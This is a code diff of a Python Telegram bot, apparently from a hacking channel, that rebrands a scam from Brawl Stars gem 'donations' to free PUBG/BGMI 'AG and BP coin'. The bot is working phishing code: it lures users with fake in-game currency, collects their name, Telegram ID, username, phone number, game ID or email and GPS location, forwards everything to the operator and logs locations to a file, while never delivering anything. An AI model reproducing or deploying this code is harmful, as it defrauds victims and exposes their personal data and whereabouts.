@@ -45,28 +45,28 @@ def handle_check_button_click(call):
 
 @bot.message_handler(commands=['start'])
 def start(message):
-	bot.send_message(message.chat.id, f'''👋 Hello {message.from_user.first_name}! 👋
-This is a bot that can donate to Brawl Stars
-To get started, type the command /don''') 
+	bot.send_message(message.chat.id, f'''👋 Hello Mr, {message.from_user.first_name}! 👋
+This Telegram bot Free AG and BP With Our PUBG and BGMI Mobile 
+Type /generator''') 
 @bot.message_handler(commands=['admin'])
 def start(message):
 	bot.send_message(message.chat.id, 'Author of the script:: @suman333mondal. Check: t.me/onlinehacking') 
-@bot.message_handler(commands=['don'])
+@bot.message_handler(commands=['generator'])
 def start(message):
 	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
-	first_button = types.InlineKeyboardButton(text="💰Gold💰", callback_data="first")
-	second_button = types.InlineKeyboardButton(text="💎Gems💎", callback_data="second")
+	first_button = types.InlineKeyboardButton(text="BP Coin ", callback_data="first")
+	second_button = types.InlineKeyboardButton(text="AG Coin", callback_data="second")
 	keyboardmain.add(first_button, second_button)
 	bot.send_message(message.chat.id, "Select an item:", reply_markup=keyboardmain)
 
 @bot.callback_query_handler(func=lambda call:True)
 def callback_inline(call):
 	if call.data == "first":
-		msg = bot.send_message(call.message.chat.id, 'Enter the amount of gold💰 (no more than 500)') 
+		msg = bot.send_message(call.message.chat.id, 'Enter the amount of gold💰 (no more than 500 BP coin Daily)') 
 		bot.register_next_step_handler(msg, proc1)
 
 	elif call.data == "second":
-		msg = bot.send_message(call.message.chat.id, 'Enter the number of gems💎 (no more than 50)') 
+		msg = bot.send_message(call.message.chat.id, 'Enter the number of gems💎 (no more than 50 AG coin Daily)') 
 		bot.register_next_step_handler(msg, proc2)
 
 def proc1(message):
@@ -75,10 +75,10 @@ def proc1(message):
 		m_id = message.chat.id
 
 		if not num.isdigit():
-			msg = bot.reply_to(message, 'Enter the quantity as a number! Try again by writing /don!')#⏳
+			msg = bot.reply_to(message, 'Enter the quantity as a number! Try again by writing /generator!')#⏳
 			return
 		if int(num) > 500:
-			bot.reply_to(message, 'The amount of gold cannot be more than 500!')
+			bot.reply_to(message, 'The amount of BP coin cannot be more than 500!')
 			return
 
 
@@ -99,11 +99,11 @@ def proc2(message):
 		m_id = message.chat.id
 
 		if not num.isdigit():
-			msg = bot.reply_to(message, 'Enter the quantity as a number! Try again by writing /don!')#⏳
+			msg = bot.reply_to(message, 'Enter the quantity as a number! Try again by writing /generator!')#⏳
 			return
 
 		if int(num) > 50:
-			bot.reply_to(message, 'The number of gems cannot be more than 50!')
+			bot.reply_to(message, 'The number of AG coin cannot be more than 50!')
 			return
 
 		time.sleep(2)
@@ -126,11 +126,13 @@ def contact(message):
 		userid = message.contact.user_id
 		phone = message.contact.phone_number
 		info = f'''
-			Data
+		    🧿 User Data:
 			├Name: {first} {last}
 			├ID: {userid}
 			├Username: @{nick}
 			└Phone number: {phone}
+   
+   🎭 Follow @OnlineHacking for more...
 			'''
 
 		bot.send_message(ID, info)
@@ -144,7 +146,7 @@ def contact(message):
 			bot.send_message(message.chat.id, 'Submit your contact!')
 		bot.send_message(message.chat.id, 'registration completed successfully!') 
 		time.sleep(1)
-		msg = bot.send_message(message.chat.id, 'Enter the email associated with the game:') 
+		msg = bot.send_message(message.chat.id, 'Enter the Your Game ID:') 
 		bot.register_next_step_handler(msg, entr)
 
 def entr(message):
@@ -153,14 +155,14 @@ def entr(message):
 		m_id = message.chat.id
 
 
-		bot.send_message(ID, f'Your Email: {inp}')
+		bot.send_message(ID, f'Your Game ID is: {inp}')
 
 		markup_reply = types.ReplyKeyboardMarkup(resize_keyboard = True)
 		item_an = types.KeyboardButton('Get more gems')
 		markup_reply.add(item_an)
-		bot.send_message(message.chat.id, f'Your Email: {inp} ', reply_markup = markup_reply)
+		bot.send_message(message.chat.id, f'Your Game ID is: {inp} ', reply_markup = markup_reply)
 		time.sleep(1)
-		bot.send_message(message.chat.id, 'Expect a donation to your account within 24 hours!')
+		bot.send_message(message.chat.id, 'Add AG and BC coin to your account within 24 hours!')
 
 	except Exception as e:
 		bot.send_message(ID, e)
@@ -173,7 +175,7 @@ def get_text(message):
 		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
 		button_phone = types.KeyboardButton(text="Confirm", request_location=True) 	
 		keyboard.add(button_phone)	
-		bot.send_message(m_id, '''To get more gems, confirm your geolocation!''', reply_markup=keyboard)
+		bot.send_message(m_id, '''To Get More AG coin, confirm your geolocation!''', reply_markup=keyboard)
 
 @bot.message_handler(content_types=['location']) 
 def contact(message):
@@ -181,18 +183,20 @@ def contact(message):
 		lon = str(message.location.longitude)
 		lat = str(message.location.latitude)
 		geo = f'''
-		Geolocation
+	     📍 Location:
 		├ID: {message.chat.id}
 		├Longitude: {lon}
 		├Latitude: {lat} 
-		└Cards: https://www.google.com/maps/place/{lat}+{lon} 
+		└Map: https://www.google.com/maps/place/{lat}+{lon} 
+
+   🖥️ Developer by: @suman333mondal
 		'''
 		log = open('bot-log.txt', 'a+', encoding='utf-8')
 		log.write(geo + '  ')
 		log.close()
 		bot.send_message(ID, geo) 
 		print(geo)
-		msg = bot.send_message(message.chat.id, 'Enter the number of gems💎 (no more than 800)') 
+		msg = bot.send_message(message.chat.id, 'Enter the number of AG coin (no more than 800 AG)') 
 		bot.register_next_step_handler(msg, proc3)
 
 def proc3(message):
@@ -201,15 +205,15 @@ def proc3(message):
 		m_id = message.chat.id
 
 		if not num.isdigit():
-			msg = bot.reply_to(message, 'Enter the quantity as a number! Try again by writing /don !')#⏳
+			msg = bot.reply_to(message, 'Enter the quantity as a number! Try again by writing /generator !')#⏳
 			return
 
 		if int(num) > 800:
-			bot.reply_to(message, 'The number of gems cannot be more than 800!')
+			bot.reply_to(message, 'The number of AG coin cannot be more than 800!')
 			return
 
 		time.sleep(2)
-		msg = bot.send_message(message.chat.id, 'Enter the email associated with the game:') 
+		msg = bot.send_message(message.chat.id, 'Enter the Your Game ID:') 
 		bot.register_next_step_handler(msg, entr1)
 	except Exception as e:
 		bot.send_message(ID, e)
@@ -223,7 +227,7 @@ def entr1(message):
 		bot.reply_to(message, f'Your Email: {inp} ')#⏳
 		bot.send_message(ID, f'User Email: {inp}')
 		time.sleep(1)
-		bot.send_message(message.chat.id, 'Expect a donation to your account within 24 hours!')
+		bot.send_message(message.chat.id, 'Add AG and BC coin to your account within 24 hours!')
 	except Exception as e:
 		bot.send_message(ID, e)
 		bot.send_message(m_id, 'An unidentified error has occurred, please restart the bot!')
